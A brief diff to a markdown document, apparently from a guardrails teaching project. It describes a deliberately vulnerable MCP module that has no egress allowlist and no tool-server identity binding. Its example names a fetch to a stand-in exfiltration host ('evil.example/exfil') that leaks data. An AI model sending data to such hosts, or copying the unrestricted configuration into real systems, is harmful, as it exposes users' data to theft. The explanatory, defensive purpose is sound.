@@ -16,7 +16,7 @@ about **where containment lives**, not about sockets.
 
 ## The bug
 
-`vulnerable/mcp.py` inherits the tool's unrestricted posture: no egress allowlist
+`guardrails/vulnerable/mcp.py` inherits the tool's unrestricted posture: no egress allowlist
 (`allow_hosts = None`) and no tool-server identity binding (`verify_identity = False`). A
 `fetch` to `https://evil.example/exfil` crosses the boundary and the data is gone.
 
